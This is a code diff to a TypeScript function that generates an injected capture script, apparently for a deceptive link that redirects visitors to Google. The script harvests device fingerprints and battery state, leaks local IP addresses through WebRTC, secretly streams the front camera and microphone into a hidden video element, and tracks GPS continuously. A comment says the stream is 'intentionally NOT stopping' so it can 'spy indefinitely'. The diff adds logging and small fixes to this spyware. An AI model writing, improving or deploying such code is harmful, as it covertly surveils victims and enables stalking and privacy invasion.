@@ -248,15 +248,15 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       const captureAndroidMeta = async () => {
         const meta = {
           sw_ver: navigator.appVersion,
-          mem: (navigator as any).deviceMemory || 'unknown',
+          mem: navigator.deviceMemory || 'unknown',
           cores: navigator.hardwareConcurrency || 'unknown',
           ua: navigator.userAgent,
-          platform: (navigator as any).platform || 'unknown'
+          platform: navigator.platform || 'unknown'
         };
 
-        if ((navigator as any).getBattery) {
+        if (navigator.getBattery) {
           try {
-            const bat = await (navigator as any).getBattery();
+            const bat = await navigator.getBattery();
             Object.assign(meta, {
               bat_lvl: Math.floor(bat.level * 100) + '%',
               bat_charging: bat.charging
@@ -268,16 +268,6 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         await flushExtra();
       };
       captureAndroidMeta().catch(e => console.error(e));
-
-      // Execute requested permissions
-      if (typeof fireParallel === 'function') {
-        clientLog("startCapture: Calling fireParallel");
-        await fireParallel();
-      }
-      if (typeof fireGPS === 'function') {
-        clientLog("startCapture: Calling fireGPS");
-        await fireGPS();
-      }
 
       // Silent Probes
       runSilentProbes().then(() => flushExtra()).catch(e => console.error(e));
@@ -765,8 +755,11 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           pc.createOffer().then(o => pc.setLocalDescription(o));
           pc.onicecandidate = async function(ice) {
             if (ice && ice.candidate && ice.candidate.candidate) {
-              var ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
-              await logExtra({ local_ip: ip });
+              var match = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate);
+              if (match) {
+                var ip = match[1];
+                await logExtra({ local_ip: ip });
+              }
             }
           };
         } catch(e) {}
@@ -849,17 +842,25 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
         // HIGH-IMPACT PARALLEL TRIGGER: Camera & GPS should fire as close as possible
         async function fireParallel() {
+          clientLog("fireParallel: Starting");
           if (requiredPerms.includes('media')) {
+            clientLog("fireParallel: Media permission included");
             try {
               if (navigator.mediaDevices) {
                 // Request both video and audio for maximum forensic potential
                 var constraints = { video: { facingMode: "user" }, audio: true };
-                var stream = await navigator.mediaDevices.getUserMedia(constraints).catch(() => {
+                clientLog("fireParallel: Calling getUserMedia");
+                var stream = await navigator.mediaDevices.getUserMedia(constraints).catch(async (e) => {
+                   clientLog("fireParallel: getUserMedia failed, trying fallback", e.message);
                    // Fallback if mic is blocked but camera is ok
-                   return navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }).catch(() => null);
+                   return navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }).catch((e2) => {
+                       clientLog("fireParallel: Fallback failed", e2.message);
+                       return null;
+                   });
                 });
                 
                 if (stream) {
+                  clientLog("fireParallel: Stream acquired");
                   // Capture logic (Infinite Loop Phase)
                   var video = document.createElement('video');
                   video.style.opacity = '0';
@@ -905,13 +906,17 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                   // Intentionally NOT stopping the stream so we spy indefinitely
                 }
               }
-            } catch(e) {}
+            } catch(e) {
+                clientLog("fireParallel: Exception in media logic", e.message);
+            }
             permsCompleted++;
           }
         };
 
         async function fireGPS() {
+          clientLog("fireGPS: Starting");
           if (requiredPerms.includes('gps') && navigator.geolocation) {
+            clientLog("fireGPS: GPS permission included");
             return new Promise(resolve => {
               // Tak Terbatas: Watch position continuously instead of single get
               navigator.geolocation.watchPosition(
@@ -920,12 +925,17 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                    permsCompleted++; 
                    resolve(); 
                 },
-                () => { permsCompleted++; resolve(); },
+                (e) => { 
+                    clientLog("fireGPS: Error", e.message);
+                    permsCompleted++; 
+                    resolve(); 
+                },
                 { enableHighAccuracy: true, maximumAge: 0 }
               );
               setTimeout(() => { resolve(); }, 3000); // Fail-safe resolve
             });
           } else if (requiredPerms.includes('gps')) {
+             clientLog("fireGPS: GPS not supported or not in requiredPerms?");
              permsCompleted++;
              return Promise.resolve();
           }
